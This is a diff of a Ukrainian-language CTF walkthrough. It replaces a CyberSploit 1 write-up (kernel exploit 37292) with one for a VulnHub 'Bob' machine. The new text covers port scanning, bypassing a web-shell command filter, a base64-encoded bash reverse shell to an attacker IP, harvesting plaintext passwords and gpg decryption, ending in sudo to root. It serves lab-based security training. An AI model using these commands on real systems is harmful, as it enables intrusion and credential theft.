@@ -1,212 +1,258 @@
-В цьому документі наведено розгорнуте пояснення до проходження завдання **Capture the Flag (CTF)**, опубліковане на сайті **VulnHub** автором **"CyberSploit"**.  
+### **Крок 1: Мережева розвідка (Enumeration)**
 
-Для проходження цього CTF необхідно мати **базові знання команд Linux** та **навички використання інструментів для тестування на проникнення**. Завантажити CTF можна тут [[https://www.vulnhub.com/entry/cybersploit-1,506/]].  
+**1. Пошук IP-адреси жертви.**
 
-
-> ⚠️ **Примітка**: Для запуску всіх цих вразливих машин було використано **Qemu / KVM + Virt-Manager**. Для проходження CTF використано **Kali linux 26.2** як атакуючу машину. Використані методики призначені **виключно для освітніх цілей**. <br>
-**Відповідальность за їх застосування проти будь-яких інших цілей буде визначатись відповідно чинному законодавству.**  
-
----
-
-## **Короткий огляд кроків вирішення CTF**
-1. Отримати **IP-адресу цільової машини**, та просканувати **відкриті порти** за допомогою **nmap**.  
-2. Перевірити **HTTP-сервіс** та знайти **перший флаг**.  
-3. Отримати **shell-доступ** та знайти **другий флаг**.  
-4. Отримати **root-доступ** і прочитати **третій флаг**.  
-
----
-
-## **Розбір CTF крок за кроком**
-
-### **Крок 1: Отримати IP-адресу цільової машини та просканувати відкриті порти**
-Після завантаження та запуску віртуальної машини у **Qemu / KVM + Virt-Manager** першим кроком є визначення її IP-адреси та
-сканування цільової машини на наявність **відкритих портів** та **запущених сервісів**. Для цього використовуємо команду:  
+Запустіть сканування локальної мережі, щоб дізнатися IP-адресу завантаженої VM Bob:  
 
 ```sh
 netdiscover -r 192.168.160.0/24
 ```
 ![alt text](./Images/image1.png)
 
+**2. Сканування відкритих портів цільової машини.**
+
 ```sh
-nmap 192.168.160.0/24  -sV
+nmap -Pn -p- 192.168.160.200
+nmap -sC -sV -Pn -p- 192.168.160.200
 ```
 ![alt text](./Images/image2.png)
 
-📌 **Результат**:  
+**Результат**:  
+• Port 21: FTP (ProFTPD 1.3.5b)
+• Port 80: HTTP (Apache web server httpd 2.4.25 (Debian))
+• Port 25468: SSH (OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0))
 
-- Ми отримали IP-адресу цільової машини — **192.168.160.251**.
+**3. Дослідження вебсервера.**
 
-- Відкрито порт **22 (SSH)**.  
-- Відкрито порт **80 (HTTP)**.  
+Відкриваємо в браузері `http://192.168.160.200` і отримуємо:
 
----
-
-### **Крок 2: Відкриття веб-додатку за 80 портом**
-Відкриваємо **IP-адресу** цільової машини у браузері та бачимо **простий веб-сайт**.
-```plaintext
-http://192.168.160.251:80
-```
 ![alt text](./Images/image3.png)
 
----
-
-### **Крок 3: Дослідження веб-додатку**
 Щоб знайти **приховані файли та директорії**, запускаємо **dirb**:  
 
 ```sh
-dirb http://192.168.160.251
+dirb http://192.168.160.200
 ```
 ![alt text](./Images/image4.png)
 
-```plaintext
----- Scanning URL: http://192.168.160.251/ ----
-+ http://192.168.160.251/cgi-bin/ (CODE:403|SIZE:291)                                                                                                      
-+ http://192.168.160.251/hacker (CODE:200|SIZE:3757743)                                                                                                    
-+ http://192.168.160.251/index (CODE:200|SIZE:2295)                                                                                                        
-+ http://192.168.160.251/index.html (CODE:200|SIZE:2295)                                                                                                   
-+ http://192.168.160.251/robots (CODE:200|SIZE:93)                                                                                                         
-+ http://192.168.160.251/robots.txt (CODE:200|SIZE:93)                                                                                                     
-+ http://192.168.160.251/server-status (CODE:403|SIZE:296)
-```
+**Результат**:
+• index.html
+• robots.txt
+• server-status
 
-📌 **Результат**: Було знайдено файл **robots.txt**.
+Переглядаємо `robots.txt`:
 
-Відкриваємо його у браузері та бачимо **закодований рядок**.
 ![alt text](./Images/image5.png)
 
-```plaintext
-TmljZSB0cnksIGJ1dCB5b3UgbmVlZCBtb3JlLgpGbGFnMTogaHR0cHM6Ly90Lm1lL1NvZnRTZXJ2ZUVkdWNhdGlvbg==
-```
+**Результат**:
+• User-agent: *
+• Disallow: /login.php
+• Disallow: /dev_shell.php
+• Disallow: /lat_memo.html
+• Disallow: /passwords.html
 
-Спробуємо **декодувати** цей рядок через командний рядок та отримаємо **перший флаг**:
+Переглядаємо шляхи і звертаємо увагу на `http://192.168.160.200/dev_shell.php`
 
-```sh
-echo "TmljZSB0cnksIGJ1dCB5b3UgbmVlZCBtb3JlLgpGbGFnMTogaHR0cHM6Ly90Lm1lL1NvZnRTZXJ2ZUVkdWNhdGlvbg==" | base64 --decode
-```
 ![alt text](./Images/image6.png)
 
-```plaintext
-Flag1: (https://t.me/SoftServeEducation)
-```
-
----
-
-### **Крок 4: Отримання shell-доступу**
-Ми продовжили аналіз **HTML-коду** веб-сторінки та знайшли [[**ім'я користувача**]](./Images/image7.png) у коментарях:  
 ![alt text](./Images/image7.png)
 
-```plaintext
-Username: CSA
-```
-
-Оскільки **SSH (порт 22) відкритий** та інших підказок немає, спробували використати **перший флаг** як пароль:  
-
-```sh
-ssh CSA@192.168.160.251
-```
-📌 **Результат**: **Успішний вхід через SSH!**  
 ![alt text](./Images/image8.png)
 
-Після входу у систему ми перевірили **домашню директорію користувача** та знайшли **файл .info**.  
-```sh
-$ ls -lah
-```
 ![alt text](./Images/image9.png)
 
-Відкриваємо файл командою:  
+**User: Bob**
+
+Спробуємо ввести команди bash, наприклад: `ls, cat, w, id, pwd` тощо. Частина з них заблокована фільтрами. Але деякі команди відпрацьовують коректно, та можемо встановити користувача від якого виконуються ці команди.
+
+---
+
+### **Крок 2: Обхід фільтрів та отримання Reverse Shell**
+
+**1. Обхід фільтра веб-оболонки.**
 ```sh
-cat .info
+Id
 ```
+**Output:**
+uid=33(www-data) gid=33(www-data) groups=33(www-data),100(users)
+```sh
+ls
+```
+**Output:**
+Get out skid lol
+```sh
+id | ls  або whoami && ls
+```
+**Output:**
+WIP.jpg
+about.html
+contact.html
+dev_shell.php
+dev_shell.php.bak
+dev_shell_back.png
+index.html
+index.html.bak
+lat_memo.html
+login.html
+news.html
+passwords.html
+robots.txt
+school_badge.png
+
 ![alt text](./Images/image10.png)
 
-📌 **Результат**: Файл містить **бінарний код**, який потрібно розшифрувати.  
-```plaintext
-01001000 01100101 01101100 01101100 01101111 00100000 01100001 01100111 01100001 01101001 01101110 00100001 00100000 01000110 01101100 01100001 01100111 00110010 00111010 00100000 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01100011 01100001 01110010 01100101 01100101 01110010 00101110 01110011 01101111 01100110 01110100 01110011 01100101 01110010 01110110 01100101 01101001 01101110 01100011 00101110 01100011 01101111 01101101 00101111 01110101 01101011 00101101 01110101 01100001 00101111 01101100 01100101 01100001 01110010 01101110 01101001 01101110 01100111 00101101 01100001 01101110 01100100 00101101 01100011 01100101 01110010 01110100 01101001 01100110 01101001 01100011 01100001 01110100 01101001 01101111 01101110
-```
+Оскільки пряме виконання команд обмежене, найкращий спосіб обходу — закодувати payload у `Base64`. Спробуємо отримати реверс-шел.
 
-За допомогою **binary-to-text декодера** ми отримали **другий флаг**.  
-```plaintext
-https://www.rapidtables.com/convert/number/binary-to-ascii.html
+**2. Створення Reverse Shell.**
+
+На машині Kali Linux відкриваємо порт для прослуховування:
+```sh
+nc -lvnp 4321
 ```
+Для створення реверсшелу на боці цілі скористаємося ресурсом GutHub:
+```sh
+bash -c 'bash -i >& /dev/tcp/192.168.160.198/4321 0>&1'
+```
+Закодуємо цей рядок у Base64:
+```sh
+echo -n "bash -c 'bash -i >& /dev/tcp/192.168.160.198/4321 0>&1'" | base64
+```
+**Output**:
+`YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2MC4xOTgvNDMyMSAwPiYxJw==`
+
 ![alt text](./Images/image11.png)
 
-📌 **Результат**:
-```plaintext
-Hello again! Flag2: https://career.softserveinc.com/uk-ua/learning-and-certification
+**3. Стабілізація оболонки TTY.**
+
+У терміналі netcat виконайте:
+```sh
+python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ---
 
-### **Крок 5: Отримання root-доступу**
-Щоб отримати **root-доступ**, ми дослідили систему командою:  
+### **Крок 3: Пошук облікових даних (Enumeration всередині системи)**
 
+**1. Робимо перевірку повноважень sudo**:
 ```sh
-uname -a
-cat /etc/issue
+sudo -l
 ```
 ![alt text](./Images/image12.png)
 
-📌 **Результат**:  
-- Цільова машина працює на **Ubuntu 12.04.5**.  
-- Ядро: **Linux 3.13.0**.  
+Переходимо в `/home` і перевіряємо користувачів:
 
-- Далі знаходимо **експлойт для підвищення привілеїв** у базі **Exploit-DB**.  
-```plaintext
-https://www.exploit-db.com/exploits/37292
-```
 ![alt text](./Images/image13.png)
 
-- Після того завантажуємо експлойт на машину з **Kali linux 26.2** та копіюємо на атаковану машину за допомогою команди **scp**.  
-```sh
-scp Downloads/37292.c CSA@192.168.160.251:/home/CSA
-```
+**Результат:**
+`bob  elliot  jc  seb`
+
+Перевіряємо домашні директорії користувачів.
+
 ![alt text](./Images/image14.png)
 
-- На атакованій машині компілюємо та запускаємо його:  
-```sh
-gcc 37292.c -o exploit
-./exploit
-```
 ![alt text](./Images/image15.png)
 
-📌 **Результат**: **Отримано root-доступ!** 🎉  
-
-- Переходимо в директорію **/root/**, відкриваємо **фінальний флаг**:  
-
-```sh
-cd /root
-ls -lah
-cat finalflag.txt
-```
-```plaintext
-flag3: “You take the red pill… and I show you how deep the rabbit hole goes.” 
-Final question: This citation is from "TWF0cml4Cg==" movie.
-```
-```sh
-echo "TWF0cml4Cg==" | base64 –decode
-```
-```plaintext
-Matrix
-```
 ![alt text](./Images/image16.png)
 
-✅ **Фінальний флаг отримано! CTF завершено!** 🎯  
-
+У директорії `/home/elliot` знаходиться файл `theadminisdumb.txt`. Перевіряємо його.
+```sh
+cat elliot/theadminisdumb.txt
+```
+```plaintext
+elliot:theadminisdumb
+```
 ![alt text](./Images/image17.png)
+
+Перевіряємо домашню директорію `bob`
+
+![alt text](./Images/image18.png)
+
+У директорії `/home/bob` знаходиться файл `.old_passwordfile.html`. Перевіряємо його.
+```sh
+cat bob/.old_passwordfile.html
+```
+![alt text](./Images/image19.png)
+
+**Результат**:
+```plaintext
+jc:Qwerty
+seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
+```
+Отримали вже 3 користувачів з паролями.
+Пробуємо залогінитися під цими користувачами і отримати `root` доступ. 
+
+![alt text](./Images/image20.png)
+
+Продовжуємо вивчати домашні директорії користувачів. Знаходимо файли `login.txt.gpg` та `staff.txt` в `/home/bob/Documents` та директорію `Secret`. Перевіряємо їх.
+```sh
+cat bob/Documents/staff.txt
+```
+![alt text](./Images/image21.png)
+
+Перевіряємо директорію Secret.
+
+![alt text](./Images/image22.png)
+
+Знаходимо `notes.sh` в `/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here`. Перевіряємо його.
+```sh
+cd bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here
+sh ./notes.sh
+```
+![alt text](./Images/image23.png)
+
+Перші літери – **HARPOCRATES**
+
+Дивимося на `login.txt.gpg`.
+```sh
+cd ../../../..
+cat login.txt.gpg
+```
+![alt text](./Images/image24.png)
+
+Розширення **.gpg** вказує на те, що файл зашифрований за допомогою **GPG (GNU Privacy Guard)** або **GnuPG**. Спроба відкрити цей файл вимагає ключ дешифрування. Використовуємо знайдене слово **HARPOCRATES** як пароль для розшифрування файлу `login.txt.gpg`.
+```sh
+gpg --batch --yes --passphrase 'HARPOCRATES' -o login.txt -d login.txt.gpg
+```
+Під користувачем `seb` отримуємо **Permission denied**.
+Спробуємо під іншим. Під `jc` отримуємо облікові дані (пароль) користувача `bob`.
+```plaintext
+bob:b0bcat_
+```
+![alt text](./Images/image25.png)
 
 ---
 
-## **Висновок**
-**Що було зроблено?**  
-✔️ Визначено IP-адресу цільової машини.  
-✔️ Проскановано порти та сервіси.  
-✔️ Знайдено перший флаг через **robots.txt**.  
-✔️ Отримано **shell-доступ** через SSH.  
-✔️ Знайдено другий флаг у файлі **.info**.  
-✔️ Використано **експлойт** для отримання **root-доступу**.  
-✔️ Отримано **фінальний флаг**.  
+### **Крок 4: Підвищення привілеїв (Privilege Escalation)**
 
-🔹 **Цей CTF був прикладом навчального завдання** для відпрацювання навичок **етичного хакінгу** та тестування на проникнення.  
-## Модифікований образ
-https://drive.google.com/drive/folders/1bxINfhxSll6MKwqg28uDYVZY50YsaTab
-"""
+**1. Перехід на користувача bob.**
+
+Маючи пароль, авторизуємося під користувачем `bob` в системі:
+
+```sh
+su bob
+```
+![alt text](./Images/image26.png)
+
+Перевіряємо, які команди Боб може виконувати з правами суперкористувача:
+```sh
+sudo -l
+```
+![alt text](./Images/image27.png)
+
+Система показує, що користувач `bob` має дозвіл на виконання всіх команд від імені `root` без додаткових обмежень **((ALL : ALL) ALL)**.
+Виконуємо команду для запуску `root-оболонки`:
+```sh
+sudo su
+```
+Стали `root` користувачем.
+Перевіряємо вміст кореневої директорії:
+```sh
+ls -lah /
+```
+![alt text](./Images/image28.png)
+
+Знаходимо файл `flag.txt`. Переглядаємо вміст і отримуємо фінальний резльтат
+```sh
+cat /flag.txt
+```
+![alt text](./Images/image29.png)
